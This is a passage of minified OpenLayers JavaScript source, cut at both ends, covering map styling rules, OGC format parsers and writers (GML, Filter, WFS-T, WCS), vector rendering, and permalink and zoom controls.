(eval(this.CLASS_NAME))(OpenLayers.Util.extend({},this))},CLASS_NAME:"OpenLayers.Symbolizer"});OpenLayers.Symbolizer.Raster=OpenLayers.Class(OpenLayers.Symbolizer,{initialize:function(a){OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)},CLASS_NAME:"OpenLayers.Symbolizer.Raster"});OpenLayers.Rule=OpenLayers.Class({id:null,name:null,title:null,description:null,context:null,filter:null,elseFilter:!1,symbolizer:null,symbolizers:null,minScaleDenominator:null,maxScaleDenominator:null,initialize:function(a){this.symbolizer={};OpenLayers.Util.extend(this,a);this.symbolizers&amp;&amp;delete this.symbolizer;this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")},destroy:function(){for(var a in this.symbolizer)this.symbolizer[a]=null;this.symbolizer=null;delete this.symbolizers},evaluate:function(a){var b= this.getContext(a),c=!0;if(this.minScaleDenominator||this.maxScaleDenominator)var d=a.layer.map.getScale();this.minScaleDenominator&amp;&amp;(c=d>=OpenLayers.Style.createLiteral(this.minScaleDenominator,b));c&amp;&amp;this.maxScaleDenominator&amp;&amp;(c=d&lt;OpenLayers.Style.createLiteral(this.maxScaleDenominator,b));c&amp;&amp;this.filter&amp;&amp;(c="OpenLayers.Filter.FeatureId"==this.filter.CLASS_NAME?this.filter.evaluate(a):this.filter.evaluate(b));return c},getContext:function(a){var b=this.context;b||(b=a.attributes||a.data);"function"== typeof this.context&amp;&amp;(b=this.context(a));return b},clone:function(){var a=OpenLayers.Util.extend({},this);if(this.symbolizers){var b=this.symbolizers.length;a.symbolizers=Array(b);for(var c=0;c&lt;b;++c)a.symbolizers[c]=this.symbolizers[c].clone()}else{a.symbolizer={};for(var d in this.symbolizer)b=this.symbolizer[d],c=typeof b,"object"===c?a.symbolizer[d]=OpenLayers.Util.extend({},b):"string"===c&amp;&amp;(a.symbolizer[d]=b)}a.filter=this.filter&amp;&amp;this.filter.clone();a.context=this.context&amp;&amp;OpenLayers.Util.extend({}, this.context);return new OpenLayers.Rule(a)},CLASS_NAME:"OpenLayers.Rule"});OpenLayers.Format.SLD=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{profile:null,defaultVersion:"1.0.0",stringifyOutput:!0,namedLayersAsArray:!1,CLASS_NAME:"OpenLayers.Format.SLD"});OpenLayers.Symbolizer.Polygon=OpenLayers.Class(OpenLayers.Symbolizer,{initialize:function(a){OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)},CLASS_NAME:"OpenLayers.Symbolizer.Polygon"});OpenLayers.Format.GML.v2=OpenLayers.Class(OpenLayers.Format.GML.Base,{schemaLocation:"http://www.opengis.net/gml http://schemas.opengis.net/gml/2.1.2/feature.xsd",initialize:function(a){OpenLayers.Format.GML.Base.prototype.initialize.apply(this,[a])},readers:{gml:OpenLayers.Util.applyDefaults({outerBoundaryIs:function(a,b){var c={};this.readChildNodes(a,c);b.outer=c.components[0]},innerBoundaryIs:function(a,b){var c={};this.readChildNodes(a,c);b.inner.push(c.components[0])},Box:function(a,b){var c= {};this.readChildNodes(a,c);b.components||(b.components=[]);var d=c.points[0],c=c.points[1];b.components.push(new OpenLayers.Bounds(d.x,d.y,c.x,c.y))}},OpenLayers.Format.GML.Base.prototype.readers.gml),feature:OpenLayers.Format.GML.Base.prototype.readers.feature,wfs:OpenLayers.Format.GML.Base.prototype.readers.wfs},write:function(a){var b;b=OpenLayers.Util.isArray(a)?"wfs:FeatureCollection":"gml:featureMember";a=this.writeNode(b,a);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation); return OpenLayers.Format.XML.prototype.write.apply(this,[a])},writers:{gml:OpenLayers.Util.applyDefaults({Point:function(a){var b=this.createElementNSPlus("gml:Point");this.writeNode("coordinates",[a],b);return b},coordinates:function(a){for(var b=a.length,c=Array(b),d,e=0;e&lt;b;++e)d=a[e],c[e]=this.xy?d.x+","+d.y:d.y+","+d.x,void 0!=d.z&amp;&amp;(c[e]+=","+d.z);return this.createElementNSPlus("gml:coordinates",{attributes:{decimal:".",cs:",",ts:" "},value:1==b?c[0]:c.join(" ")})},LineString:function(a){var b= this.createElementNSPlus("gml:LineString");this.writeNode("coordinates",a.components,b);return b},Polygon:function(a){var b=this.createElementNSPlus("gml:Polygon");this.writeNode("outerBoundaryIs",a.components[0],b);for(var c=1;c&lt;a.components.length;++c)this.writeNode("innerBoundaryIs",a.components[c],b);return b},outerBoundaryIs:function(a){var b=this.createElementNSPlus("gml:outerBoundaryIs");this.writeNode("LinearRing",a,b);return b},innerBoundaryIs:function(a){var b=this.createElementNSPlus("gml:innerBoundaryIs"); this.writeNode("LinearRing",a,b);return b},LinearRing:function(a){var b=this.createElementNSPlus("gml:LinearRing");this.writeNode("coordinates",a.components,b);return b},Box:function(a){var b=this.createElementNSPlus("gml:Box");this.writeNode("coordinates",[{x:a.left,y:a.bottom},{x:a.right,y:a.top}],b);this.srsName&amp;&amp;b.setAttribute("srsName",this.srsName);return b}},OpenLayers.Format.GML.Base.prototype.writers.gml),feature:OpenLayers.Format.GML.Base.prototype.writers.feature,wfs:OpenLayers.Format.GML.Base.prototype.writers.wfs}, CLASS_NAME:"OpenLayers.Format.GML.v2"});OpenLayers.Format.Filter.v1_0_0=OpenLayers.Class(OpenLayers.Format.GML.v2,OpenLayers.Format.Filter.v1,{VERSION:"1.0.0",schemaLocation:"http://www.opengis.net/ogc/filter/1.0.0/filter.xsd",initialize:function(a){OpenLayers.Format.GML.v2.prototype.initialize.apply(this,[a])},readers:{ogc:OpenLayers.Util.applyDefaults({PropertyIsEqualTo:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.EQUAL_TO});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsNotEqualTo:function(a, b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.NOT_EQUAL_TO});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsLike:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.LIKE});this.readChildNodes(a,c);var d=a.getAttribute("wildCard"),e=a.getAttribute("singleChar"),f=a.getAttribute("escape");c.value2regex(d,e,f);b.filters.push(c)}},OpenLayers.Format.Filter.v1.prototype.readers.ogc),gml:OpenLayers.Format.GML.v2.prototype.readers.gml, feature:OpenLayers.Format.GML.v2.prototype.readers.feature},writers:{ogc:OpenLayers.Util.applyDefaults({PropertyIsEqualTo:function(a){var b=this.createElementNSPlus("ogc:PropertyIsEqualTo");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsNotEqualTo:function(a){var b=this.createElementNSPlus("ogc:PropertyIsNotEqualTo");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsLike:function(a){var b=this.createElementNSPlus("ogc:PropertyIsLike", {attributes:{wildCard:"*",singleChar:".",escape:"!"}});this.writeNode("PropertyName",a,b);this.writeNode("Literal",a.regex2value(),b);return b},BBOX:function(a){var b=this.createElementNSPlus("ogc:BBOX");a.property&amp;&amp;this.writeNode("PropertyName",a,b);var c=this.writeNode("gml:Box",a.value,b);a.projection&amp;&amp;c.setAttribute("srsName",a.projection);return b}},OpenLayers.Format.Filter.v1.prototype.writers.ogc),gml:OpenLayers.Format.GML.v2.prototype.writers.gml,feature:OpenLayers.Format.GML.v2.prototype.writers.feature}, writeSpatial:function(a,b){var c=this.createElementNSPlus("ogc:"+b);this.writeNode("PropertyName",a,c);if(a.value instanceof OpenLayers.Filter.Function)this.writeNode("Function",a.value,c);else{var d;d=a.value instanceof OpenLayers.Geometry?this.writeNode("feature:_geometry",a.value).firstChild:this.writeNode("gml:Box",a.value);a.projection&amp;&amp;d.setAttribute("srsName",a.projection);c.appendChild(d)}return c},CLASS_NAME:"OpenLayers.Format.Filter.v1_0_0"});OpenLayers.Format.WFST.v1_0_0=OpenLayers.Class(OpenLayers.Format.Filter.v1_0_0,OpenLayers.Format.WFST.v1,{version:"1.0.0",srsNameInQuery:!1,schemaLocations:{wfs:"http://schemas.opengis.net/wfs/1.0.0/WFS-transaction.xsd"},initialize:function(a){OpenLayers.Format.Filter.v1_0_0.prototype.initialize.apply(this,[a]);OpenLayers.Format.WFST.v1.prototype.initialize.apply(this,[a])},readNode:function(a,b,c){return OpenLayers.Format.GML.v2.prototype.readNode.apply(this,arguments)},readers:{wfs:OpenLayers.Util.applyDefaults({WFS_TransactionResponse:function(a, b){b.insertIds=[];b.success=!1;this.readChildNodes(a,b)},InsertResult:function(a,b){var c={fids:[]};this.readChildNodes(a,c);b.insertIds=b.insertIds.concat(c.fids)},TransactionResult:function(a,b){this.readChildNodes(a,b)},Status:function(a,b){this.readChildNodes(a,b)},SUCCESS:function(a,b){b.success=!0}},OpenLayers.Format.WFST.v1.prototype.readers.wfs),gml:OpenLayers.Format.GML.v2.prototype.readers.gml,feature:OpenLayers.Format.GML.v2.prototype.readers.feature,ogc:OpenLayers.Format.Filter.v1_0_0.prototype.readers.ogc}, writers:{wfs:OpenLayers.Util.applyDefaults({Query:function(a){a=OpenLayers.Util.extend({featureNS:this.featureNS,featurePrefix:this.featurePrefix,featureType:this.featureType,srsName:this.srsName,srsNameInQuery:this.srsNameInQuery},a);var b=a.featurePrefix,c=this.createElementNSPlus("wfs:Query",{attributes:{typeName:(b?b+":":"")+a.featureType}});a.srsNameInQuery&amp;&amp;a.srsName&amp;&amp;c.setAttribute("srsName",a.srsName);a.featureNS&amp;&amp;c.setAttribute("xmlns:"+b,a.featureNS);if(a.propertyNames)for(var b=0,d=a.propertyNames.length;b&lt; d;b++)this.writeNode("ogc:PropertyName",{property:a.propertyNames[b]},c);a.filter&amp;&amp;(this.setFilterProperty(a.filter),this.writeNode("ogc:Filter",a.filter,c));return c}},OpenLayers.Format.WFST.v1.prototype.writers.wfs),gml:OpenLayers.Format.GML.v2.prototype.writers.gml,feature:OpenLayers.Format.GML.v2.prototype.writers.feature,ogc:OpenLayers.Format.Filter.v1_0_0.prototype.writers.ogc},CLASS_NAME:"OpenLayers.Format.WFST.v1_0_0"});OpenLayers.ElementsIndexer=OpenLayers.Class({maxZIndex:null,order:null,indices:null,compare:null,initialize:function(a){this.compare=a?OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER_Y_ORDER:OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER_DRAWING_ORDER;this.clear()},insert:function(a){this.exists(a)&amp;&amp;this.remove(a);var b=a.id;this.determineZIndex(a);for(var c=-1,d=this.order.length,e;1&lt;d-c;)e=parseInt((c+d)/2),0&lt;this.compare(this,a,OpenLayers.Util.getElement(this.order[e]))?c=e:d=e;this.order.splice(d, 0,b);this.indices[b]=this.getZIndex(a);return this.getNextElement(d)},remove:function(a){a=a.id;var b=OpenLayers.Util.indexOf(this.order,a);0&lt;=b&amp;&amp;(this.order.splice(b,1),delete this.indices[a],this.maxZIndex=0&lt;this.order.length?this.indices[this.order[this.order.length-1]]:0)},clear:function(){this.order=[];this.indices={};this.maxZIndex=0},exists:function(a){return null!=this.indices[a.id]},getZIndex:function(a){return a._style.graphicZIndex},determineZIndex:function(a){var b=a._style.graphicZIndex; null==b?(b=this.maxZIndex,a._style.graphicZIndex=b):b>this.maxZIndex&amp;&amp;(this.maxZIndex=b)},getNextElement:function(a){a+=1;if(a&lt;this.order.length){var b=OpenLayers.Util.getElement(this.order[a]);void 0==b&amp;&amp;(b=this.getNextElement(a));return b}return null},CLASS_NAME:"OpenLayers.ElementsIndexer"}); OpenLayers.ElementsIndexer.IndexingMethods={Z_ORDER:function(a,b,c){b=a.getZIndex(b);var d=0;c&amp;&amp;(a=a.getZIndex(c),d=b-a);return d},Z_ORDER_DRAWING_ORDER:function(a,b,c){a=OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER(a,b,c);c&amp;&amp;0==a&amp;&amp;(a=1);return a},Z_ORDER_Y_ORDER:function(a,b,c){a=OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER(a,b,c);c&amp;&amp;0===a&amp;&amp;(b=c._boundsBottom-b._boundsBottom,a=0===b?1:b);return a}}; OpenLayers.Renderer.Elements=OpenLayers.Class(OpenLayers.Renderer,{rendererRoot:null,root:null,vectorRoot:null,textRoot:null,xmlns:null,xOffset:0,indexer:null,BACKGROUND_ID_SUFFIX:"_background",LABEL_ID_SUFFIX:"_label",LABEL_OUTLINE_SUFFIX:"_outline",initialize:function(a,b){OpenLayers.Renderer.prototype.initialize.apply(this,arguments);this.rendererRoot=this.createRenderRoot();this.root=this.createRoot("_root");this.vectorRoot=this.createRoot("_vroot");this.textRoot=this.createRoot("_troot");this.root.appendChild(this.vectorRoot); this.root.appendChild(this.textRoot);this.rendererRoot.appendChild(this.root);this.container.appendChild(this.rendererRoot);b&amp;&amp;(b.zIndexing||b.yOrdering)&amp;&amp;(this.indexer=new OpenLayers.ElementsIndexer(b.yOrdering))},destroy:function(){this.clear();this.xmlns=this.root=this.rendererRoot=null;OpenLayers.Renderer.prototype.destroy.apply(this,arguments)},clear:function(){var a,b=this.vectorRoot;if(b)for(;a=b.firstChild;)b.removeChild(a);if(b=this.textRoot)for(;a=b.firstChild;)b.removeChild(a);this.indexer&amp;&amp; this.indexer.clear()},setExtent:function(a,b){var c=OpenLayers.Renderer.prototype.setExtent.apply(this,arguments),d=this.getResolution();if(this.map.baseLayer&amp;&amp;this.map.baseLayer.wrapDateLine){var e,f=a.getWidth()/this.map.getExtent().getWidth();a=a.scale(1/f);f=this.map.getMaxExtent();f.right>a.left&amp;&amp;f.right&lt;a.right?e=!0:f.left>a.left&amp;&amp;f.left&lt;a.right&amp;&amp;(e=!1);if(e!==this.rightOfDateLine||b)c=!1,this.xOffset=!0===e?f.getWidth()/d:0;this.rightOfDateLine=e}return c},getNodeType:function(a,b){},drawGeometry:function(a, b,c){var d=a.CLASS_NAME,e=!0;if("OpenLayers.Geometry.Collection"==d||"OpenLayers.Geometry.MultiPoint"==d||"OpenLayers.Geometry.MultiLineString"==d||"OpenLayers.Geometry.MultiPolygon"==d){for(var d=0,f=a.components.length;d&lt;f;d++)e=this.drawGeometry(a.components[d],b,c)&amp;&amp;e;return e}d=e=!1;"none"!=b.display&amp;&amp;(b.backgroundGraphic?this.redrawBackgroundNode(a.id,a,b,c):d=!0,e=this.redrawNode(a.id,a,b,c));!1==e&amp;&amp;(b=document.getElementById(a.id))&amp;&amp;(b._style.backgroundGraphic&amp;&amp;(d=!0),b.parentNode.removeChild(b)); d&amp;&amp;(b=document.getElementById(a.id+this.BACKGROUND_ID_SUFFIX))&amp;&amp;b.parentNode.removeChild(b);return e},redrawNode:function(a,b,c,d){c=this.applyDefaultSymbolizer(c);a=this.nodeFactory(a,this.getNodeType(b,c));a._featureId=d;a._boundsBottom=b.getBounds().bottom;a._geometryClass=b.CLASS_NAME;a._style=c;b=this.drawGeometryNode(a,b,c);if(!1===b)return!1;a=b.node;this.indexer?(c=this.indexer.insert(a))?this.vectorRoot.insertBefore(a,c):this.vectorRoot.appendChild(a):a.parentNode!==this.vectorRoot&amp;&amp;this.vectorRoot.appendChild(a); this.postDraw(a);return b.complete},redrawBackgroundNode:function(a,b,c,d){c=OpenLayers.Util.extend({},c);c.externalGraphic=c.backgroundGraphic;c.graphicXOffset=c.backgroundXOffset;c.graphicYOffset=c.backgroundYOffset;c.graphicZIndex=c.backgroundGraphicZIndex;c.graphicWidth=c.backgroundWidth||c.graphicWidth;c.graphicHeight=c.backgroundHeight||c.graphicHeight;c.backgroundGraphic=null;c.backgroundXOffset=null;c.backgroundYOffset=null;c.backgroundGraphicZIndex=null;return this.redrawNode(a+this.BACKGROUND_ID_SUFFIX, b,c,null)},drawGeometryNode:function(a,b,c){c=c||a._style;var d={isFilled:void 0===c.fill?!0:c.fill,isStroked:void 0===c.stroke?!!c.strokeWidth:c.stroke},e;switch(b.CLASS_NAME){case "OpenLayers.Geometry.Point":!1===c.graphic&amp;&amp;(d.isFilled=!1,d.isStroked=!1);e=this.drawPoint(a,b);break;case "OpenLayers.Geometry.LineString":d.isFilled=!1;e=this.drawLineString(a,b);break;case "OpenLayers.Geometry.LinearRing":e=this.drawLinearRing(a,b);break;case "OpenLayers.Geometry.Polygon":e=this.drawPolygon(a,b);break; case "OpenLayers.Geometry.Rectangle":e=this.drawRectangle(a,b)}a._options=d;return!1!=e?{node:this.setStyle(a,c,d,b),complete:e}:!1},postDraw:function(a){},drawPoint:function(a,b){},drawLineString:function(a,b){},drawLinearRing:function(a,b){},drawPolygon:function(a,b){},drawRectangle:function(a,b){},drawCircle:function(a,b){},removeText:function(a){var b=document.getElementById(a+this.LABEL_ID_SUFFIX);b&amp;&amp;this.textRoot.removeChild(b);(a=document.getElementById(a+this.LABEL_OUTLINE_SUFFIX))&amp;&amp;this.textRoot.removeChild(a)}, getFeatureIdFromEvent:function(a){var b=a.target,c=b&amp;&amp;b.correspondingUseElement;return(c?c:b||a.srcElement)._featureId},eraseGeometry:function(a,b){if("OpenLayers.Geometry.MultiPoint"==a.CLASS_NAME||"OpenLayers.Geometry.MultiLineString"==a.CLASS_NAME||"OpenLayers.Geometry.MultiPolygon"==a.CLASS_NAME||"OpenLayers.Geometry.Collection"==a.CLASS_NAME)for(var c=0,d=a.components.length;c&lt;d;c++)this.eraseGeometry(a.components[c],b);else(c=OpenLayers.Util.getElement(a.id))&amp;&amp;c.parentNode&amp;&amp;(c.geometry&amp;&amp;(c.geometry.destroy(), c.geometry=null),c.parentNode.removeChild(c),this.indexer&amp;&amp;this.indexer.remove(c),c._style.backgroundGraphic&amp;&amp;(c=OpenLayers.Util.getElement(a.id+this.BACKGROUND_ID_SUFFIX))&amp;&amp;c.parentNode&amp;&amp;c.parentNode.removeChild(c))},nodeFactory:function(a,b){var c=OpenLayers.Util.getElement(a);c?this.nodeTypeCompare(c,b)||(c.parentNode.removeChild(c),c=this.nodeFactory(a,b)):c=this.createNode(b,a);return c},nodeTypeCompare:function(a,b){},createNode:function(a,b){},moveRoot:function(a){var b=this.root;a.root.parentNode== this.rendererRoot&amp;&amp;(b=a.root);b.parentNode.removeChild(b);a.rendererRoot.appendChild(b)},getRenderLayerId:function(){return this.root.parentNode.parentNode.id},isComplexSymbol:function(a){return"circle"!=a&amp;&amp;!!a},CLASS_NAME:"OpenLayers.Renderer.Elements"});OpenLayers.Control.ArgParser=OpenLayers.Class(OpenLayers.Control,{center:null,zoom:null,layers:null,displayProjection:null,getParameters:function(a){a=a||window.location.href;var b=OpenLayers.Util.getParameters(a),c=a.indexOf("#");0&lt;c&amp;&amp;(a="?"+a.substring(c+1,a.length),OpenLayers.Util.extend(b,OpenLayers.Util.getParameters(a)));return b},setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);for(var b=0,c=this.map.controls.length;b&lt;c;b++){var d=this.map.controls[b];if(d!=this&amp;&amp; "OpenLayers.Control.ArgParser"==d.CLASS_NAME){d.displayProjection!=this.displayProjection&amp;&amp;(this.displayProjection=d.displayProjection);break}}b==this.map.controls.length&amp;&amp;(b=this.getParameters(),b.layers&amp;&amp;(this.layers=b.layers,this.map.events.register("addlayer",this,this.configureLayers),this.configureLayers()),b.lat&amp;&amp;b.lon&amp;&amp;(this.center=new OpenLayers.LonLat(parseFloat(b.lon),parseFloat(b.lat)),b.zoom&amp;&amp;(this.zoom=parseFloat(b.zoom)),this.map.events.register("changebaselayer",this,this.setCenter), this.setCenter()))},setCenter:function(){this.map.baseLayer&amp;&amp;(this.map.events.unregister("changebaselayer",this,this.setCenter),this.displayProjection&amp;&amp;this.center.transform(this.displayProjection,this.map.getProjectionObject()),this.map.setCenter(this.center,this.zoom))},configureLayers:function(){if(this.layers.length==this.map.layers.length){this.map.events.unregister("addlayer",this,this.configureLayers);for(var a=0,b=this.layers.length;a&lt;b;a++){var c=this.map.layers[a],d=this.layers.charAt(a); "B"==d?this.map.setBaseLayer(c):"T"!=d&amp;&amp;"F"!=d||c.setVisibility("T"==d)}}},CLASS_NAME:"OpenLayers.Control.ArgParser"});OpenLayers.Control.Permalink=OpenLayers.Class(OpenLayers.Control,{argParserClass:OpenLayers.Control.ArgParser,element:null,anchor:!1,base:"",displayProjection:null,initialize:function(a,b,c){null===a||"object"!=typeof a||OpenLayers.Util.isElement(a)?(OpenLayers.Control.prototype.initialize.apply(this,[c]),this.element=OpenLayers.Util.getElement(a),this.base=b||document.location.href):(this.base=document.location.href,OpenLayers.Control.prototype.initialize.apply(this,[a]),null!=this.element&amp;&amp;(this.element= OpenLayers.Util.getElement(this.element)))},destroy:function(){this.element&amp;&amp;this.element.parentNode==this.div&amp;&amp;(this.div.removeChild(this.element),this.element=null);this.map&amp;&amp;this.map.events.unregister("moveend",this,this.updateLink);OpenLayers.Control.prototype.destroy.apply(this,arguments)},setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);for(var b=0,c=this.map.controls.length;b&lt;c;b++){var d=this.map.controls[b];if(d.CLASS_NAME==this.argParserClass.CLASS_NAME){d.displayProjection!= this.displayProjection&amp;&amp;(this.displayProjection=d.displayProjection);break}}b==this.map.controls.length&amp;&amp;this.map.addControl(new this.argParserClass({displayProjection:this.displayProjection}))},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.element||this.anchor||(this.element=document.createElement("a"),this.element.innerHTML=OpenLayers.i18n("Permalink"),this.element.href="",this.div.appendChild(this.element));this.map.events.on({moveend:this.updateLink,changelayer:this.updateLink, changebaselayer:this.updateLink,scope:this});this.updateLink();return this.div},updateLink:function(){var a=this.anchor?"#":"?",b=this.base,c=null;-1!=b.indexOf("#")&amp;&amp;!1==this.anchor&amp;&amp;(c=b.substring(b.indexOf("#"),b.length));-1!=b.indexOf(a)&amp;&amp;(b=b.substring(0,b.indexOf(a)));b=b.split("#")[0]+a+OpenLayers.Util.getParameterString(this.createParams());c&amp;&amp;(b+=c);this.anchor&amp;&amp;!this.element?window.location.href=b:this.element.href=b},createParams:function(a,b,c){a=a||this.map.getCenter();var d=OpenLayers.Util.getParameters(this.base); if(a)for(d.zoom=b||this.map.getZoom(),b=a.lat,a=a.lon,this.displayProjection&amp;&amp;(b=OpenLayers.Projection.transform({x:a,y:b},this.map.getProjectionObject(),this.displayProjection),a=b.x,b=b.y),d.lat=Math.round(1E5*b)/1E5,d.lon=Math.round(1E5*a)/1E5,c=c||this.map.layers,d.layers="",a=0,b=c.length;a&lt;b;a++){var e=c[a];d.layers=e.isBaseLayer?d.layers+(e==this.map.baseLayer?"B":"0"):d.layers+(e.getVisibility()?"T":"F")}return d},CLASS_NAME:"OpenLayers.Control.Permalink"});OpenLayers.Layer.TMS=OpenLayers.Class(OpenLayers.Layer.Grid,{serviceVersion:"1.0.0",layername:null,type:null,isBaseLayer:!0,tileOrigin:null,serverResolutions:null,zoomOffset:0,initialize:function(a,b,c){var d=[];d.push(a,b,{},c);OpenLayers.Layer.Grid.prototype.initialize.apply(this,d)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.TMS(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getURL:function(a){a=this.adjustBounds(a);var b=this.getServerResolution(), c=Math.round((a.left-this.tileOrigin.lon)/(b*this.tileSize.w));a=Math.round((a.bottom-this.tileOrigin.lat)/(b*this.tileSize.h));b=this.getServerZoom();c=this.serviceVersion+"/"+this.layername+"/"+b+"/"+c+"/"+a+"."+this.type;a=this.url;OpenLayers.Util.isArray(a)&amp;&amp;(a=this.selectUrl(c,a));return a+c},setMap:function(a){OpenLayers.Layer.Grid.prototype.setMap.apply(this,arguments);this.tileOrigin||(this.tileOrigin=new OpenLayers.LonLat(this.map.maxExtent.left,this.map.maxExtent.bottom))},CLASS_NAME:"OpenLayers.Layer.TMS"});OpenLayers.Format.WCSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.1.0",CLASS_NAME:"OpenLayers.Format.WCSCapabilities"});OpenLayers.Format.WCSCapabilities.v1=OpenLayers.Class(OpenLayers.Format.XML,{regExes:{trimSpace:/^\s*|\s*$/g,splitSpace:/\s+/},defaultPrefix:"wcs",read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);return b},CLASS_NAME:"OpenLayers.Format.WCSCapabilities.v1"});OpenLayers.Format.WCSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.WCSCapabilities.v1,{namespaces:{wcs:"http://www.opengis.net/wcs",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",ows:"http://www.opengis.net/ows"},errorProperty:"service",readers:{wcs:{WCS_Capabilities:function(a,b){this.readChildNodes(a,b)},Service:function(a,b){b.service={};this.readChildNodes(a,b.service)},name:function(a,b){b.name=this.getChildValue(a)},label:function(a,b){b.label= this.getChildValue(a)},keywords:function(a,b){b.keywords=[];this.readChildNodes(a,b.keywords)},keyword:function(a,b){b.push(this.getChildValue(a))},responsibleParty:function(a,b){b.responsibleParty={};this.readChildNodes(a,b.responsibleParty)},individualName:function(a,b){b.individualName=this.getChildValue(a)},organisationName:function(a,b){b.organisationName=this.getChildValue(a)},positionName:function(a,b){b.positionName=this.getChildValue(a)},contactInfo:function(a,b){b.contactInfo={};this.readChildNodes(a, b.contactInfo)},phone:function(a,b){b.phone={};this.readChildNodes(a,b.phone)},voice:function(a,b){b.voice=this.getChildValue(a)},facsimile:function(a,b){b.facsimile=this.getChildValue(a)},address:function(a,b){b.address={};this.readChildNodes(a,b.address)},deliveryPoint:function(a,b){b.deliveryPoint=this.getChildValue(a)},city:function(a,b){b.city=this.getChildValue(a)},postalCode:function(a,b){b.postalCode=this.getChildValue(a)},country:function(a,b){b.country=this.getChildValue(a)},electronicMailAddress:function(a, b){b.electronicMailAddress=this.getChildValue(a)},fees:function(a,b){b.fees=this.getChildValue(a)},accessConstraints:function(a,b){b.accessConstraints=this.getChildValue(a)},ContentMetadata:function(a,b){b.contentMetadata=[];this.readChildNodes(a,b.contentMetadata)},CoverageOfferingBrief:function(a,b){var c={};this.readChildNodes(a,c);b.push(c)},name:function(a,b){b.name=this.getChildValue(a)},label:function(a,b){b.label=this.getChildValue(a)},lonLatEnvelope:function(a,b){var c=this.getElementsByTagNameNS(a, "http://www.opengis.net/gml","pos");if(2==c.length){var d={},e={};OpenLayers.Format.GML.v3.prototype.readers.gml.pos.apply(this,[c[0],d]);OpenLayers.Format.GML.v3.prototype.readers.gml.pos.apply(this,[c[1],e]);b.lonLatEnvelope={};b.lonLatEnvelope.srsName=a.getAttribute("srsName");b.lonLatEnvelope.min=d.points[0];b.lonLatEnvelope.max=e.points[0]}}}},CLASS_NAME:"OpenLayers.Format.WCSCapabilities.v1_0_0"});OpenLayers.Strategy.Fixed=OpenLayers.Class(OpenLayers.Strategy,{preload:!1,activate:function(){var a=OpenLayers.Strategy.prototype.activate.apply(this,arguments);if(a)if(this.layer.events.on({refresh:this.load,scope:this}),!0==this.layer.visibility||this.preload)this.load();else this.layer.events.on({visibilitychanged:this.load,scope:this});return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;this.layer.events.un({refresh:this.load,visibilitychanged:this.load, scope:this});return a},load:function(a){var b=this.layer;b.events.triggerEvent("loadstart",{filter:b.filter});b.protocol.read(OpenLayers.Util.applyDefaults({callback:this.merge,filter:b.filter,scope:this},a));b.events.un({visibilitychanged:this.load,scope:this})},merge:function(a){var b=this.layer;b.destroyFeatures();var c=a.features;if(c&amp;&amp;0&lt;c.length){var d=b.projection,e=b.map.getProjectionObject();if(!e.equals(d))for(var f,g=0,h=c.length;g&lt;h;++g)(f=c[g].geometry)&amp;&amp;f.transform(d,e);b.addFeatures(c)}b.events.triggerEvent("loadend", {response:a})},CLASS_NAME:"OpenLayers.Strategy.Fixed"});OpenLayers.Control.Zoom=OpenLayers.Class(OpenLayers.Control,{zoomInText:"+",zoomInId:"olZoomInLink",zoomOutText:"\u2212",zoomOutId:"olZoomOutLink",draw:function(){var a=OpenLayers.Control.prototype.draw.apply(this),b=this.getOrCreateLinks(a),c=b.zoomIn,b=b.zoomOut,d=this.map.events;b.parentNode!==a&amp;&amp;(d=this.events,d.attachToElement(b.parentNode));d.register("buttonclick",this,this.onZoomClick);this.zoomInLink=c;this.zoomOutLink=b;return a},getOrCreateLinks:function(a){var b=document.getElementById(this.zoomInId), c=document.getElementById(this.zoomOutId);b||(b=document.createElement("a"),b.href="#zoomIn",b.appendChild(document.createTextNode(this.zoomInText)),b.className="olControlZoomIn",a.appendChild(b));OpenLayers.Element.addClass(b,"olButton");c||(c=document.createElement("a"),c.href="#zoomOut",c.appendChild(document.createTextNode(this.zoomOutText)),c.className="olControlZoomOut",a.appendChild(c));OpenLayers.Element.addClass(c,"olButton");return{zoomIn:b,zoomOut:c}},onZoomClick:function(a){a=a.buttonElement; a===this.zoomInLink?this.map.zoomIn():a===this.zoomOutLink&amp;&amp;this.map.zoomOut()},destroy:function(){this.map&amp;&amp;this.map.events.unregister("buttonclick",this,this.onZoomClick);delete this.zoomInLink;delete this.zoomOutLink;OpenLayers.Control.prototype.destroy.apply(this)},CLASS_NAME:"OpenLayers.Control.Zoom"});OpenLayers.Layer.PointTrack=OpenLayers.Class(OpenLayers.Layer.Vector,{dataFrom:null,styleFrom:null,addNodes:function(a,b){if(2>a.length)throw Error("At least two point features have to be added to create a line from");for(var c=Array(a.length-1),d,e,f,g=0,h=a.length;g&lt;h;g++){d=a[g];f=d.geometry;if(!f)f=d.lonlat,f=new OpenLayers.Geometry.Point(f.lon,f.lat);else 